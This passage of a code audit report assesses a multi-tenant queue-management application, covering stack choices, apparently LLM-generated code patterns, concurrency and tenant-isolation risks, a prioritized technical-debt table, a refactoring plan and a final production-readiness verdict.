- Multi-region.
- WebUSB printing.
- Kafka.
- The `module-adapter` framework as a whole (revisit when first real hardware partner shows up).

## 10.5 Stack choices — reality check

| Choice          | Verdict                                                                                  |
| --------------- | ---------------------------------------------------------------------------------------- |
| Java 21 + Spring Boot 3.4 | Reasonable. Virtual threads are nice. Talent pool exists in Uzbekistan and Russia. |
| Next.js 15 + React 19   | Fine. Don't use bleeding-edge App Router features when stable would do.                  |
| PostgreSQL 16 + TimescaleDB | PostgreSQL — yes. TimescaleDB — overkill until you have analytics traffic.               |
| RabbitMQ              | Wrong choice. You don't need a message broker for an MVP. Use Spring events or Postgres LISTEN/NOTIFY. |
| Telegram Bot          | Right call for the market.                                                                |
| Docker Compose on a droplet | Fine for MVP. Plan migration to managed services (DO Managed PG, App Platform, or k3s) at Series A. |
| Zustand               | Fine.                                                                                     |
| Inline styles         | Wrong. Move to CSS Modules or vanilla Tailwind classes (Tailwind v4 is already in devDeps but unused). |

---

# 11. Claude Logic Failure Detection

Where the code reads like LLM-generated boilerplate that wasn't pressure-tested:

## 11.1 The `resolveOrgId` bug — classic LLM hallucination

```java
private UUID resolveOrgId(Authentication auth) {
    if (auth != null && auth.getDetails() instanceof java.util.Map<?,?> details) {
        Object orgId = details.get("org_id");
        if (orgId instanceof String s && !s.isBlank()) return UUID.fromString(s);
    }
    return tenantService.getFirstOrgId();
}
```

The code "looks correct." It tries to read `org_id` from `auth.getDetails()`. But the same project's `JwtAuthFilter` sets `auth.setDetails(claims)` where `claims` is `io.jsonwebtoken.Claims`. `Claims` extends `Map<String,Object>` — wait, actually `Claims` **does** implement `Map`. Let me re-check.

Looking at jjwt source: `public interface Claims extends Map<String, Object>, ClaimsMutator<Claims>`. **So `Claims instanceof Map` IS true.** The hallucination is actually mine for one moment — the `instanceof Map` does match. So the `org_id` claim is read.

But: `Object orgId = details.get("org_id");` and then `if (orgId instanceof String s)`. JWT claims of type `org_id` are stored as a `String` (we wrote it that way in `JwtService.mint`). So the cast succeeds.

**Re-verdict:** the resolveOrgId may actually work in the happy path. But the path was untested — only by reading the JwtService code can you verify the claim type. The fallback to `getFirstOrgId()` triggers if `org_id` is null OR an empty string. New users without an org get assigned to "first org" — which is the seeded Asaka Bank. That's still a multi-tenant break for any user who hasn't been linked to an org yet.

**Adjusted severity:** HIGH (not CRITICAL). The bug is: new users without `org_id` are silently assigned to whatever org is oldest. Not "always tenant 1" — but "any unassigned user → tenant 1."

(The other CRITICAL bugs in §1.2 stand.)

## 11.2 LLM patterns visible across the code

1. **"Fake completeness" comments.** Comments that say "Phase 2," "future ML model," "TimescaleDB hypertable handled by ApplicationReadyEvent listener" — but the referenced code doesn't exist. The LLM completed the architectural narrative without completing the implementation.

2. **Boilerplate over judgment.** The `module-adapter` framework has an `AdapterRegistry` to look up adapters by type — but the lookup is called once per event, never cached, and only one of the four adapters does anything. An LLM built the right pattern at the wrong layer.

3. **Pattern duplication without abstraction.** `TelegramBotService` and `TelegramWebhookController` both implement `/start`, `/status`, `/cancel` with near-identical SQL and near-identical message strings. An LLM was told to "add a webhook endpoint" and reimplemented from scratch rather than refactoring.

4. **Wrong primitive choice.** `InheritableThreadLocal` is rarely what you want — but it shows up because an LLM saw `ThreadLocal` + virtual threads and reached for the "inheritable" variant without thinking about leakage.

5. **Spring AI BOM imported, never used.** Dependency added to the BOM out of completeness. No code path uses it. An LLM added it because the README says "AI."

6. **Hardcoded landing page stats.** "2.4M tickets/month, 142 enterprise customers, 38% wait cut" — pure fabrication. An LLM was asked to write a marketing landing page and filled the social-proof slots with plausible-looking numbers.

7. **Dead modules, dead packages.** `common-domain`, `packages/config`, `packages/ui` (4 unused primitives) — created because a monorepo structure "should have" these. An LLM matched a template, not the actual needs.

8. **Duplicate imports in the same file.** `TicketController.java` imports `com.zeyvo.queue.domain.Ticket` twice on lines 7 and 8. Sign of automated insertion that didn't deduplicate.

9. **Re-import of `module-notification` in Dockerfile (line 15-16).** Same pattern: copy-paste without verification.

10. **`linkTelegramAccount()` is a no-op query.** `UPDATE app.user_account SET telegram_id = :tid WHERE telegram_id = :tid` — written as if it were an upsert. An LLM produced syntactically correct SQL that does nothing.

## 11.3 What a senior engineer would have done differently

| LLM choice                                   | Senior choice                                                              |
| -------------------------------------------- | -------------------------------------------------------------------------- |
| 8 modules from day one                       | Single module, refactor later                                              |
| RabbitMQ in compose                          | Postgres LISTEN/NOTIFY or Spring events; defer Kafka/Rabbit                |
| Two Telegram services (auth + notification)  | One `TelegramClient` with two responsibilities, or two methods on one bean |
| `InheritableThreadLocal` for tenancy         | Either `ThreadLocal` + explicit propagation, or pass tenant via parameter   |
| 800-line landing page with inline styles     | CSS-in-JS with a real design system, or `.module.css` files                |
| Heuristic + 200 lines of `/admin/predict` UI promising Phase 2 | Heuristic only. No "AI predictions" claim until the model exists.          |
| `permitAll` on `/v1/tickets`                 | Authenticated by default; explicit `@Anonymous` only for join + cancel + view-own |
| Frontend admin gated by client-side `roles` array | Backend `@PreAuthorize`. Client gate is UX-only, backend is law.           |
| `next-intl` set up + JSON files + no calls   | Either commit to i18n or remove the dep.                                   |

---

# 12. Hidden Problems & Future Risks

## 12.1 Concurrency landmines (live ammunition)

- **Capacity check TOCTOU** — will hit you the first time a single branch sees > 50 simultaneous joins (rare for banks, common for clinics on flu-shot day).
- **Two-operator no-show race** — will hit you on day one of multi-operator usage. Tickets will silently become no-shows.
- **`closeCurrentlyServingOnWindow` aggressive no-show** — will hit you the first time an operator double-clicks "Call next" by accident.
- **Telegram bot polling + webhook collision** — already silently broken in production deploy if the webhook is registered.
- **No-show scheduler vs. operator marking served** — silent data loss because `UPDATE ... affected = 0` doesn't throw.

## 12.2 Scaling collapse points

- **First multi-instance deploy** — rate limit, in-memory schedulers, in-memory Telegram codes all break. Estimate: 2 weeks of work to move state to Redis and add scheduler leader election (ShedLock).
- **First 10M tickets** — `app.ticket` will need partitioning. Indexes get heavy. Use `pg_partman`.
- **First 1000 concurrent WS clients** — Spring's `SimpleBroker` will become a bottleneck. Move to RabbitMQ STOMP relay (Rabbit is already in compose, ironically) or to Redis pub/sub.

## 12.3 Architectural collapse points

- **Tenant isolation retrofit** — requires touching every query. Either add a Hibernate filter (`@FilterDef` + `@Filter`) or row-level security at the DB. Both are 2-week projects.
- **i18n retrofit** — replacing every hardcoded string in 9k LOC of TSX is grueling.
- **Removing inline styles** — equivalent to a frontend rewrite.

## 12.4 Maintainability disasters

- **The two Telegram services will diverge.** Bug in `/status` formatting fixed in one, missed in the other. Customer-visible inconsistency.
- **Schedulers + scrapers in the same process** — when you finally split into services, the Telegram poller has to come along.
- **`module-adapter` becomes the legacy bridge module** — every new device type adds another dead branch in the registry.

## 12.5 Debugging nightmares ahead

- **No structured logging** with correlation IDs. When a ticket flow breaks across HTTP + WS + Telegram, you can't trace it.
- **No tracing.** Latency spikes are unattributable.
- **No DB query plan tracking.** When `findActiveByBranch` slows down, you'll find out via customer complaints.

---

# 13. Technical Debt Report

| #  | Item                                                                                            | Sev    | Fix priority | Est. effort | Impact          |
| -- | ----------------------------------------------------------------------------------------------- | ------ | ------------ | ----------- | --------------- |
| 1  | Add `@PreAuthorize` to all admin/super-admin/operator endpoints                                | CRIT   | P0           | 2 days      | Auth correctness |
| 2  | Remove leaked Telegram bot token default + rotate token                                         | CRIT   | P0           | 1 hour      | Bot security   |
| 3  | Disable `/v1/dev/seed` + `/v1/integrations/telegram/register-webhook` in prod                  | CRIT   | P0           | 1 hour      | Avoid bot takeover |
| 4  | Enforce `TELEGRAM_WEBHOOK_SECRET` non-empty in prod (fail-fast)                                | CRIT   | P0           | 2 hours     | Webhook security |
| 5  | Fix `resolveOrgId` to handle no-org users correctly (don't assign to first org)                 | HIGH   | P0           | 1 day       | Multi-tenant correctness |
| 6  | Require auth + ownership on `/v1/tickets/{id}` GET + cancel + rate                              | HIGH   | P0           | 1 day       | Tenant isolation |
| 7  | STOMP CONNECT JWT interceptor + subscription auth                                              | HIGH   | P0           | 2 days      | Real-time tenant isolation |
| 8  | Move access token out of localStorage                                                          | HIGH   | P0           | 1 day       | XSS surface     |
| 9  | Add `auth_date` age check in `validateAndExtractUser`                                          | HIGH   | P1           | 1 hour      | Replay prevention |
| 10 | Move scheduler state (nudgedTickets, lastUpdateId) + rate limit + Telegram codes to Redis      | HIGH   | P1           | 3 days      | Multi-instance readiness |
| 11 | Add ShedLock to all `@Scheduled` methods                                                       | HIGH   | P1           | 1 day       | No double-fire across instances |
| 12 | Replace `InheritableThreadLocal` with `ThreadLocal` + explicit propagation                     | MED    | P1           | 2 days      | Virtual-thread safety |
| 13 | Use `@TransactionalEventListener(AFTER_COMMIT)` instead of `@EventListener` everywhere         | MED    | P1           | 1 day       | Event consistency |
| 14 | Add `windowId` null-check in `QueueEventBroadcaster.on(TicketNoShow)`                          | MED    | P1           | 30 min      | NPE prevention  |
| 15 | Fix capacity-check TOCTOU race                                                                 | MED    | P2           | 2 days      | Branch overrun prevention |
| 16 | Move analytics queries to TimescaleDB hypertable + add event writer                            | MED    | P2           | 1 week      | Analytics scale |
| 17 | Remove RabbitMQ + Spring AI BOM + unused Redis deps                                            | MED    | P2           | 1 day       | Operational simplicity |
| 18 | Merge `TelegramBotService` and `TelegramWebhookController` into one bean                       | MED    | P2           | 1 day       | Maintainability |
| 19 | Add security headers in nginx (CSP, HSTS, X-Frame-Options)                                     | MED    | P2           | 1 hour      | Browser security |
| 20 | Replace inline styles with CSS Modules or Tailwind classes                                     | HIGH   | P2           | 3-4 weeks   | Long-term frontend velocity |
| 21 | Wire i18n into UI (replace hardcoded strings)                                                  | MED    | P3           | 2 weeks     | Real localization |
| 22 | Delete `common-domain`, `packages/config`, unused `packages/ui` primitives                     | LOW    | P3           | 2 hours     | Hygiene         |
| 23 | Remove fake landing-page testimonials, fake compliance claims                                  | HIGH   | P0           | 1 hour      | Legal / honesty |
| 24 | Delete `/admin/predict` "Phase 2" UI or replace with honest copy                               | MED    | P1           | 30 min      | Sales / truth   |
| 25 | Replace WindowController/AdminUserController polling-N+1 patterns with single joined queries   | MED    | P3           | 2 days      | Performance     |
| 26 | Add JSON-format logging in dev + correlation ID injection                                      | MED    | P3           | 2 days      | Observability   |
| 27 | Add real integration tests (Testcontainers spinup with Postgres + queue flows)                 | HIGH   | P2           | 2 weeks     | Regression safety |
| 28 | Add `closed_at` on expire path, write idempotency_key, clean state machine                     | LOW    | P3           | 1 day       | Data consistency |
| 29 | Fix Dockerfile.backend duplicate `module-notification` COPY                                    | LOW    | P3           | 5 min       | Build hygiene   |
| 30 | Fix `DeviceController` `/api/v1/devices` double-prefix path                                    | MED    | P1           | 30 min      | Functional      |
| 31 | Operating hours overnight (22:00→02:00) support                                                | LOW    | P3           | 2 hours     | Feature gap     |
| 32 | Index `(actor_user_id, occurred_at)` on `audit_event`                                          | LOW    | P3           | 5 min       | Query perf      |
| 33 | Add `/actuator/prometheus` auth or unguess-able prefix                                         | MED    | P2           | 1 hour      | Metric privacy  |

**Total debt by priority:**
- P0 (must fix before any prod traffic): items 1–8, 23 (≈ 8 days)
- P1 (within first month): items 9–14, 24, 30 (≈ 2 weeks)
- P2 (within first quarter): items 15–20, 27, 33 (≈ 5–6 weeks)
- P3 (rolling): items 21–22, 25–26, 28–29, 31–32 (≈ 3 weeks)

---

# 14. Refactoring Plan

## 14.1 Immediate (week 1)

**Goal:** make it safe to expose to a single real tenant.

1. Day 1 — Secrets and bot security
   - Rotate Telegram bot token. Remove default from `application.yml`. Re-issue.
   - Disable `register-webhook` in prod (move behind `@Profile` or `@PreAuthorize('SUPER_ADMIN')`).
   - Disable `/v1/dev/seed` in prod (or guard with `@Profile`).
   - Require `TELEGRAM_WEBHOOK_SECRET` to be non-empty when running with profile=prod (fail startup).

2. Day 2-3 — RBAC and tenant scoping
   - Add `@PreAuthorize` to `AdminUserController`, `PlatformController`, `BranchController` (writes), `WindowController` (writes/calls), `TicketController.transfer`, `AnalyticsController`.
   - Fix `resolveOrgId` fallback so unassigned users get a clear 403, not "first org."
   - Add tenant-scoped query helper in `TicketService.callNext` (verify window belongs to caller's org).

3. Day 4 — Endpoint hardening
   - `GET /v1/tickets/{id}` requires either anonymous-with-correct-idempotency-key, or auth+ownership.
   - `POST /v1/tickets/{id}/cancel` same.
   - `POST /v1/tickets/{id}/rate` same.
   - Remove `permitAll` from `/v1/devices/register`.

4. Day 5 — Frontend safety
   - Move access token out of localStorage to memory.
   - Add `headers()` block in `next.config.mjs` for HSTS, X-Frame-Options, etc.

## 14.2 Medium-term (weeks 2-6)

**Goal:** make it ready for the third tenant.

1. **Refactor to use Redis for shared state** — rate limit, Telegram link codes, scheduler nudge memory, last update ID. Add ShedLock for `@Scheduled` leader election.
2. **Move analytics off OLTP** — write `ticket_event` rows in event listeners; activate the TimescaleDB hypertable; switch `AnalyticsController` to read from it.
3. **Consolidate Telegram code** — merge `TelegramBotService` + `TelegramWebhookController` into one `TelegramService` with handler methods called from both paths. Remove polling (use webhook only in prod).
4. **STOMP auth** — add `ChannelInterceptor` that pulls JWT from CONNECT headers, validates, and scopes subscriptions to user's tenant. Reject `/topic/branches/{X}/ops` if caller's org ≠ branch's org.
5. **Switch to `@TransactionalEventListener(AFTER_COMMIT)`** for queue + audit + notification + adapter listeners.
6. **Add Testcontainers integration tests** — at minimum: 10-concurrent-take-ticket capacity test, 2-operator-call-next race, no-show scheduler vs. mark-served race.
7. **Remove RabbitMQ + Spring AI from build** — until they're actually used.

## 14.3 Long-term (quarters 2-3)

**Goal:** make it ready for 50 tenants and 1M tickets/day.

1. **Component-ize the frontend.** Build a real design-system module under `packages/ui`. Migrate one route at a time off inline styles. Target Tailwind v4 classes (already in devDeps).
2. **Wire i18n.** Replace hardcoded English with `useTranslations()`. Backfill ru/uz strings.
3. **Add observability stack** — OTel collector, Loki for logs, Tempo for traces, Grafana dashboards. Define SLOs (e.g., p95 callNext < 200 ms).
4. **Move to managed infrastructure** — DigitalOcean Managed PostgreSQL (with read replica), DO App Platform or k3s. Drop the single-droplet architecture.
5. **Real ETA model** — once you have 30 days of data per branch, build a `(branch, service, weekday, hour)` median-wait calibration on top of the heuristic. Validate vs. holdout. Ship behind feature flag with shadow mode for two weeks.
6. **Database partitioning** — pg_partman on `app.ticket` (monthly).
7. **Schema-per-tenant or row-level security** — pick one model for true tenant isolation.

---

# 15. Final Verdict

## Is this production-ready?

**No.** Not in the form audited. With the P0 items in §13 fixed (~ 8 days of work), it can serve **one specific tenant** under your operational control (e.g., a single Asaka Bank branch you've onboarded manually). It is not safe to expose to a public SaaS signup until §13 P1 items are also done.

## Is this startup-ready?

**Conditionally yes.** As an MVP for proving the queue-management value-prop at one branch, the queue engine itself is competent and the user flows work. The frontend can demo. But you cannot use this codebase to onboard tenants without first fixing the multi-tenancy and RBAC holes. **Do not ship to a paying customer until P0 is done.**

## Is this scalable?

**No.** Multiple critical state stores are in-memory (rate limit, Telegram codes, scheduler memory). All `@Scheduled` tasks will multi-fire under horizontal scale. STOMP broker is in-process. Single PG instance with 512 MB limit. Real scale work is 4–6 weeks (§14.2).

## Is this maintainable?

**Mid.** Backend: yes, the modular structure (even with dead modules) gives clear seams; the queue logic is in one place. Frontend: no. 9k LOC of inline styles will choke the next 5 features. Refactor or live with it as legacy.

## What will break first?

In order of likelihood:
1. **Multi-tenant data leak** the moment a second tenant signs up.
2. **Bot takeover** within 24 hours of the repo going public (or earlier if anyone scans).
3. **Operator no-show on accidental double-click** within the first day of multi-operator usage.
4. **Telegram bot stops working** after first restart (webhook unregistered + poll loop runs blind).
5. **Capacity check race** when a single branch sees a spike.
6. **Memory exhaustion** in `RateLimitFilter.buckets` after a few months of uptime.

## What should be rewritten?

- The frontend admin panels — they need a design system + react-query + Tailwind classes.
- The Telegram service layer — one bean, not two.
- The auth/tenant resolution path — proper RBAC + tenant context that's actually consulted.
- The analytics module — into TimescaleDB it should go.

## What is genuinely good?

- The PostgreSQL schema and Flyway migrations.
- Atomic `generateTicketNumber`.
- `SELECT FOR UPDATE SKIP LOCKED` in `callNext`.
- The Telegram WebApp HMAC validation (modulo the missing auth_date check).
- The shape of the `module-queue` event model.
- `DEPLOY.md` runbook.
- The Docker multi-stage builds.

## One sentence to a board

> The product idea is solid, the schema is solid, and the queue logic is solid — but the security model is unfinished, the AI is fiction, and the multi-tenancy is theatre; budget **2 weeks of focused engineering before any second tenant touches it**, and another **6 weeks before scaling beyond one box**.

---

## Appendix A — Audit method

- Read every Java source file (~103 files, 6,670 LOC) and every TSX page (~31 files, 9,337 LOC).
- Cross-referenced security config against controller endpoints.
- Grepped for `@PreAuthorize`, `hasRole`, `RabbitListener`, `Cacheable`, `TenantContext.get`, `useTranslations`, `@TransactionalEventListener` — confirming or refuting each architectural claim.
- Traced concurrency primitives (locks, SKIP LOCKED, `ON CONFLICT`) to verify race-safety claims.
- Compared landing-page promises against code reality (AI, compliance, scale).
- Reviewed Docker, nginx, and deployment scripts for production posture.

## Appendix B — Files referenced

Backend (representative — full list of 103 files reviewed):
- `backend/app/src/main/java/com/zeyvo/ZeyvoApplication.java`
- `backend/app/src/main/java/com/zeyvo/platform/{AuditEventListener,PlatformController}.java`
- `backend/app/src/main/resources/{application,application-dev,application-local,application-prod}.yml`
- `backend/app/src/main/resources/db/migration/{V1,V2,V3}*.sql`
- `backend/module-auth/src/main/java/com/zeyvo/auth/api/{AuthController,DevAuthController,AdminUserController,MeController}.java`
- `backend/module-auth/src/main/java/com/zeyvo/auth/service/{AuthService,JwtService,TelegramAuthService,TelegramBotService,EskizSmsService}.java`
- `backend/module-auth/src/main/java/com/zeyvo/auth/infra/security/{SecurityConfig,JwtAuthFilter}.java`
- `backend/module-auth/src/main/java/com/zeyvo/auth/domain/{UserAccount,Session,Otp}.java`
- `backend/module-queue/src/main/java/com/zeyvo/queue/service/{TicketService,HeuristicEtaEstimator,NoShowScheduler,NoShowAutoAdvanceListener,TicketLifecycleScheduler}.java`
- `backend/module-queue/src/main/java/com/zeyvo/queue/api/{TicketController,WindowController}.java`
- `backend/module-queue/src/main/java/com/zeyvo/queue/domain/Ticket.java`
- `backend/module-tenant/src/main/java/com/zeyvo/tenant/service/TenantService.java`
- `backend/module-tenant/src/main/java/com/zeyvo/tenant/api/BranchController.java`
- `backend/module-notification/src/main/java/com/zeyvo/notification/{TelegramNotificationService,TelegramWebhookController,NotificationListener}.java`
- `backend/module-realtime/src/main/java/com/zeyvo/realtime/{BroadcastService,QueueEventBroadcaster}.java`
- `backend/module-realtime/src/main/java/com/zeyvo/realtime/config/WebSocketConfig.java`
- `backend/module-adapter/src/main/java/com/zeyvo/adapter/api/DeviceController.java`
- `backend/module-adapter/src/main/java/com/zeyvo/adapter/service/{DeviceService,SyncOrchestrator,AdapterRegistry}.java`
- `backend/module-adapter/src/main/java/com/zeyvo/adapter/impl/GenericHttpAdapter.java`
- `backend/module-analytics/src/main/java/com/zeyvo/analytics/AnalyticsController.java`
- `backend/common-web/src/main/java/com/zeyvo/common/web/{ApiError,DomainException,GlobalExceptionHandler,HealthController,RateLimitFilter,TenantContext}.java`

Frontend (representative):
- `apps/web/app/layout.tsx`, `apps/web/app/(app)/page.tsx`, `apps/web/app/(app)/layout.tsx`
- `apps/web/app/(app)/branches/page.tsx`, `apps/web/app/(app)/branch/[id]/page.tsx`, `apps/web/app/(app)/ticket/[id]/page.tsx`
- `apps/web/app/(admin)/admin/layout.tsx`, `apps/web/app/(admin)/admin/queue/page.tsx`, `apps/web/app/(admin)/admin/predict/page.tsx`
- `apps/web/app/(super)/platform/layout.tsx`, `apps/web/app/(super)/platform/{page,flags/page}.tsx`
- `apps/web/app/(kiosk)/kiosk/[branchId]/page.tsx`, `apps/web/app/(signage)/signage/[branchId]/page.tsx`
- `apps/web/app/(auth)/sign-in/page.tsx`
- `apps/web/lib/{api,realtime,types}.ts`, `apps/web/stores/{auth,ui}.ts`, `apps/web/i18n/request.ts`

Infrastructure:
- `infra/docker/{docker-compose,docker-compose.prod}.yml`, `infra/docker/{Dockerfile.backend,Dockerfile.web,rabbitmq.conf,seed.sql}`
- `infra/docker/postgres-init/01_extensions.sql`
- `infra/nginx/zeyvo.conf`, `infra/runbooks/DEPLOY.md`, `infra/scripts/{deploy,backup}.sh`

Build/config:
- `backend/{settings,build}.gradle.kts`, `backend/gradle/libs.versions.toml`
- `package.json`, `turbo.json`, `pnpm-workspace.yaml`, `Makefile`
- `apps/web/{package.json,next.config.mjs,tsconfig.json,postcss.config.mjs}`

---

*End of audit. Authored from first-principles review of every important file in the repository, no assumptions taken on trust.*
